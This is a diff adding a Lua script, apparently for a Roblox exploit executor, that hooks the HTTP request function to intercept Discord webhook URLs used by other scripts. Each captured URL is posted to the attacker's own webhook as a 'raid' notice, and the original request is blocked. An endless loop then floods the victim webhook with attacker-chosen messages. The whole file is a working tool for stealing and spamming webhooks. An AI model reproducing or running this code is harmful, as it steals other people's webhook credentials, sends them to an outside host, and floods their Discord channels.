@@ -1,0 +1,61 @@
+local HttpService = game:GetService("HttpService")
+
+local nukeData = {
+    ["content"] = getgenv().content,
+    ["username"] = getgenv().username,
+    ["avatar_url"] = getgenv().avatar_url
+}
+
+local sentWebhooks = {}
+
+local function sendEmbed(webhookURL)
+    request({
+        Url = getgenv().myWebhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            ["embeds"] = {{
+                ["title"] = "⚠️️ Webhook Raid Started",
+                ["description"] = "**Status:** Webhook is attack!\n**Target:** " .. webhookURL,
+                ["color"] = 16711680,
+                ["footer"] = {["text"] = "Raid System"},
+                ["thumbnail"] = {
+                    ["url"] = "https://cdn.discordapp.com/attachments/1325839539649904702/1339631208664924171/r6-0079-imax-r34-01-v01-dkp-bt1886-0003665-64bfa6e19583f.png?ex=67af6c49&is=67ae1ac9&hm=5f83c2359241634979bbbcc184bb70e6406ba43eeb5f38dda443968b4c852fd8&"
+                }
+            }}
+        })
+    })
+end
+
+if request then
+    local oldRequest
+    oldRequest = hookfunction(request, function(req)
+        if req.Url and string.find(req.Url, "discord.com/api/webhooks/") then
+            if req.Url == getgenv().myWebhook then
+                return oldRequest(req)
+            end
+
+            if not sentWebhooks[req.Url] then
+                sentWebhooks[req.Url] = true
+                sendEmbed(req.Url)
+
+                spawn(function()
+                    while true do
+                        oldRequest({
+                            Url = req.Url,
+                            Method = "POST",
+                            Headers = {["Content-Type"] = "application/json"},
+                            Body = HttpService:JSONEncode(nukeData)
+                        })
+                    end
+                end)
+            end
+
+            return nil
+        end
+
+        return oldRequest(req)
+    end)
+else
+    warn("request function is not available.")
+end
